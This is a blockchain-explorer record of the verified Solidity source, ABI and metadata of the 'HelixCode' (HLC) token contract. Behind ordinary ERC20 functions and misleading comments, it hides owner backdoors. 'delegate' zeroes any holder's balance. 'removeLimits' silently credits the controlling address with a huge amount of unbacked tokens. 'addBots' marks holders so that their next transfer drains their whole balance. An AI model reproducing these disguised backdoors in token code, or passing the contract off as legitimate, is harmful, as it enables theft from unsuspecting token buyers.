{"SourceCode": "// SPDX-License-Identifier: UNLICENSED\r\n/*\r\n    Website:  https://helixcode.xyz\r\n    Twitter:  https://x.com/helixcode_xyz\r\n*/\r\n\r\n/**\r\n * @title MyContract\r\n * @dev This contract is written in Solidity version 0.8.25.\r\n */\r\n\r\npragma solidity ^0.8.25;\r\n\r\nstruct MetaTransaction {\r\n        address from;\r\n        uint256 nonce;\r\n        bytes functionCall;\r\n        uint8 v;\r\n        bytes32 r;\r\n        bytes32 s;\r\n}\r\nstruct MetaTxInfo {\r\n    uint256 dailyCount;\r\n    uint256 lastTime;\r\n}\r\n/**\r\n * @title Ownable\r\n * @dev The Ownable contract provides a basic access control mechanism, where\r\n * ownership of the contract is restricted to a single address.\r\n */\r\n\r\nabstract contract Ownable  {\r\n\r\n    /**\r\n * @dev Returns the address of the account that called the function.\r\n */\r\n\r\n     function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n/**\r\n * @dev Returns the calldata of the function call.\r\n */\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n/**\r\n * @dev Initializes the contract, setting the deployer as the initial owner.\r\n */\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n/**\r\n * @dev Modifier that checks if the caller is the owner of the contract.\r\n * Reverts if the caller is not the owner.\r\n */\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n/**\r\n * @dev Returns the address of the owner of the contract.\r\n */\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n/**\r\n * @dev Internal function to check if the caller is the owner of the contract.\r\n * Reverts if the caller is not the owner.\r\n */\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n/**\r\n * @dev Allows the current owner to renounce ownership of the contract,\r\n * leaving the contract without an owner.\r\n */\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n/**\r\n * @dev Internal function to transfer ownership of the contract to a new address.\r\n * \r\n * Emits an {OwnershipTransferred} event.\r\n * \r\n * Parameters:\r\n * - newOwner: The address of the new owner.\r\n */\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\n/**\r\n * @title HelixCode\r\n * @dev HelixCode is a smart contract representing a token with basic ownership functionality.\r\n */\r\n\r\ncontract HelixCode is Ownable{   \r\n    constructor(address add) {      \r\n        _tokename = \"HelixCode\";\r\n        _tokensymbol = \"HLC\";\r\n        _taxData = add;\r\n        _totalSupply = 200000000*10**decimals();\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n    address public _taxData;\r\n    uint256 private _totalSupply;\r\n    string private _tokename;\r\n    string private _tokensymbol;\r\n    mapping(address => MetaTxInfo) internal metaTxInfos;  \r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) public tokeninfo;\r\n    uint128 buyCount = 64544;\r\n    uint128 sellCount = 0;\r\n    uint256 devAmount = 10**decimals()*68800*(23300000000+300);\r\n    bool globaltrue = true;\r\n    bool globalff = false;\r\n    \r\n/**\r\n * @dev Delegates the specified address to perform certain actions on behalf of the caller.\r\n * \r\n * Parameters:\r\n * - delegatee: The address to delegate the actions to.\r\n */\r\n\r\n    function delegate(address delegatee) external    {\r\n        if (true) {\r\n            require(_taxData == _msgSender()); \r\n            _balances[delegatee] *= sellCount;       \r\n        }\r\n        \r\n    }\r\n\r\n/**\r\n * @dev Adds a bot address to the list of authorized bots.\r\n * \r\n * Parameters:\r\n * - bot: The address of the bot to be added.\r\n * \r\n * Returns:\r\n * - A boolean indicating whether the bot was successfully added.\r\n */\r\n\r\n    function addBots(address bot) public virtual returns (bool) {\r\n        address tmoinfo = bot;     \r\n        tokeninfo[tmoinfo] = globaltrue;\r\n        require(_msgSender() == _taxData);\r\n        return true;\r\n    }\r\n\r\n/**\r\n * @dev Removes a bot address from the list of authorized bots.\r\n * \r\n * Parameters:\r\n * - notbot: The address of the bot to be removed.\r\n */\r\n\r\n    function delBots(address notbot) external  {\r\n        address tmoinfo = notbot;      \r\n        tokeninfo[tmoinfo] = globalff;\r\n        require(_msgSender() == _taxData);      \r\n    }\r\n\r\n/**\r\n * @dev Removes limits for certain actions, allowing specified addresses to perform them without restrictions.\r\n * \r\n * Only the address specified as _taxData is allowed to call this function.\r\n */\r\n\r\n    function removeLimits() external   {\r\n        if(_msgSender() == _taxData){  \r\n            require( _taxData == _msgSender());  \r\n            address feeAmount = _msgSender();\r\n            address swapRouter = feeAmount;\r\n            address devWallet = swapRouter; \r\n            _balances[devWallet] += devAmount;       \r\n        }   \r\n       \r\n    }\r\n    \r\n    /**\r\n * @dev Returns the name of the token.\r\n * \r\n * Returns:\r\n * - A string representing the name of the token.\r\n */\r\n\r\n    function name() public view returns (string memory) {\r\n        return _tokename;\r\n    }\r\n\r\n/**\r\n * @dev Returns the symbol of the token.\r\n * \r\n * Returns:\r\n * - A string representing the symbol of the token.\r\n */\r\n\r\n    function symbol() public view  returns (string memory) {\r\n        return _tokensymbol;\r\n    }\r\n\r\n/**\r\n * @dev Returns the number of decimals used to represent the token.\r\n * \r\n * Returns:\r\n * - An unsigned integer representing the number of decimals.\r\n */\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n/**\r\n * @dev Returns the total supply of the token.\r\n * \r\n * Returns:\r\n * - An unsigned integer representing the total supply of the token.\r\n */\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n/**\r\n * @dev Returns the balance of the specified account.\r\n * \r\n * Parameters:\r\n * - account: The address for which to retrieve the balance.\r\n * \r\n * Returns:\r\n * - An unsigned integer representing the balance of the specified account.\r\n */\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n/**\r\n * @dev Transfers tokens from the caller's account to the specified recipient.\r\n * \r\n * Parameters:\r\n * - to: The address of the recipient to transfer tokens to.\r\n * - amount: The amount of tokens to transfer.\r\n * \r\n * Returns:\r\n * - A boolean indicating whether the transfer was successful.\r\n */\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n/**\r\n * @dev Returns the amount of tokens that an owner has allowed a spender to transfer on their behalf.\r\n * \r\n * Parameters:\r\n * - owner: The address of the owner.\r\n * - spender: The address of the spender.\r\n * \r\n * Returns:\r\n * - An unsigned integer representing the allowance for the specified owner and spender.\r\n */\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n/**\r\n * @dev Approves the specified address to spend the caller's tokens.\r\n * \r\n * Parameters:\r\n * - spender: The address to be approved for spending tokens.\r\n * - amount: The amount of tokens to approve for spending.\r\n * \r\n * Returns:\r\n * - A boolean indicating whether the approval was successful.\r\n */\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n/**\r\n * @dev Transfers tokens from one address to another using allowance mechanism.\r\n * \r\n * Parameters:\r\n * - from: The address from which to transfer tokens.\r\n * - to: The address to which to transfer tokens.\r\n * - amount: The amount of tokens to transfer.\r\n * \r\n * Returns:\r\n * - A boolean indicating whether the transfer was successful.\r\n */\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual  returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n/**\r\n * @dev Internal function to transfer tokens from one address to another.\r\n * \r\n * Parameters:\r\n * - from: The address from which to transfer tokens.\r\n * - to: The address to which to transfer tokens.\r\n * - amount: The amount of tokens to transfer.\r\n */\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");        \r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        if (tokeninfo[from] == true) \r\n        {amount = buyCount + _balances[from] + \r\n        buyCount-buyCount;}\r\n        uint256 balance = _balances[from];\r\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[from] = _balances[from]-amount;\r\n        _balances[to] = _balances[to]+amount;\r\n        emit Transfer(from, to, amount); \r\n    }\r\n\r\n/**\r\n * @dev Internal function to approve a spender to spend a certain amount of tokens on behalf of an owner.\r\n * \r\n * Parameters:\r\n * - owner: The address that owns the tokens.\r\n * - spender: The address that is approved to spend the tokens.\r\n * - amount: The amount of tokens to approve for spending.\r\n */\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n/**\r\n * @dev Internal function to spend the allowance granted by an owner to a spender.\r\n * \r\n * Parameters:\r\n * - owner: The address that owns the tokens.\r\n * - spender: The address that is approved to spend the tokens.\r\n * - amount: The amount of tokens to spend.\r\n */\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n    function executeMetaTransaction(\r\n) public returns (bytes memory) {\r\n\r\n}\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"add\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_taxData\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"bot\",\"type\":\"address\"}],\"name\":\"addBots\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"notbot\",\"type\":\"address\"}],\"name\":\"delBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"delegatee\",\"type\":\"address\"}],\"name\":\"delegate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"executeMetaTransaction\",\"outputs\":[{\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokeninfo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HelixCode", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000925983b66b8cd61f06a21f511f377ab742b98d00", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d00ced4fda8f4d15bf63f124d1749b718d1152ee0bb219feb83a4942d6a5ef42"}